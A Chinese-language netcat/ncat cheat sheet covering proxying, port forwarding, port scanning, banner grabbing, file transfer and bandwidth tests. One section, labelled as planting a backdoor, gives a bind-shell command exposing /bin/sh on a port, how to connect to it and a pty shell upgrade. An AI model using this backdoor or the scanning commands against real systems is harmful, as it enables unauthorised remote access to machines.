## nc 命令
```
$ nc --version
GNU netcat 0.7.1, a rewrite of the famous networking tool.

$ ncat -h
OpenBSD netcat
This is nc from the netcat-openbsd package. An alternative nc is available
```

### ncat 带有 socks 功能
```
ncat -X 5 -x 127.0.0.1:9150 -q 3 -v program-think.blogspot.com 443
```

### ncat 端口转发
```
mkfifo nc_pipe
nc -l -p 1234 < nc_pipe | nc 127.0.0.1 5678 > nc_pipe
```

### nc 自带端口扫描过滤功能
```
nc -zvn 192.168.0.102 1-6553
```

### 信息收集
``` 
echo "EXIT" | ncat -vq 5 -n 192.168.10.102 22
Connection to 192.168.10.102 22 port [tcp/*] succeeded!

echo "EXIT" | ncat -vq 5 192.168.10.102 22
Connection to 192.168.10.102 22 port [tcp/ssh] succeeded!

echo "EXIT" | nc -v -n 192.168.10.102 22
192.168.10.102 22 (ssh) open 
``` 

### 网页交互
```
 echo -e "GET / HTTP/1.0\r\n\r\n" | nc -v sspai.com 80 > sspai.html 
```

### nc 聊天
```
macOS
nc -l -p 1078

Linux
nc 192.168.0.104 1078
```

### nc 代理
```
ncat -X 5 -x 127.0.0.1:9050 -q 3 -v program-think.blogspot.com 443
```

### 传输数据
```
接收数据 注意必须是 ncat
ncat -l 8080 > new.txt
nc 127.0.0.1 1111 | pv > movie.mp4

发送数据
nc 192.168.0.104 8080 < new.txt
pv movie.mp4 | nc -l -p 1111
```

### 压缩传输
```
服务端
tar -c book |nc -l 9999

客户端
nc 192.168.1.12 9999 | tar -x
```

### nc shell 后门
```
植入后门
ncat -l -p 6666 -e /bin/sh
ncat -l -p -k 6666 -e /bin/sh

连接后门
nc -v 192.168.0.104 6666

python -c 'import pty; pty.spawn("/bin/bash")'
```

### 下载速度
```
server
pv /dev/zero | nc -l -p 1111

client
nc 192.168.0.104 1111
```

### 上传速度
```
server
nc -l -p 80 | pv

client
nc 23.100.90.119 80 < /dev/zero
```